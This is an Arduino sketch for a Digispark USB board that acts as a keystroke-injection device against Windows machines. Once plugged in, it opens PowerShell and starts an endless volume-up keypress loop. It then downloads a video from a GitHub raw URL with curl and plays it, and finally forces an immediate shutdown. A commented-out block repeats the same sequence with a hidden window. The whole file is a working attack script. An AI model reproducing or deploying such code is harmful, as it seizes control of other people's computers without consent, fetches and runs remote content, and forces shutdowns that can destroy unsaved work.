#include "DigiKeyboard.h"
void setup(){
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("While (""\"True\"""){(new-object -com wscript.shell).SendKeys([char]175)}");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("curl -o a.mp4 https://raw.githubusercontent.com/OpenSorcery101/Lobster/main/Lob_vid.mp4; .\\a.mp4");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(11000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("shutdown /s /f /t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }

void loop(){
  /*DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden {While (""\"True\"""){(new-object -com wscript.shell).SendKeys([char]175)}}");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("curl -o a.mp4 https://raw.githubusercontent.com/OpenSorcery101/Lobster/main/Lob_vid.mp4; .\a.mp4");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(6000);
  DigiKeyboard.print("shutdown /s /f /t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for(;;){}*/
}
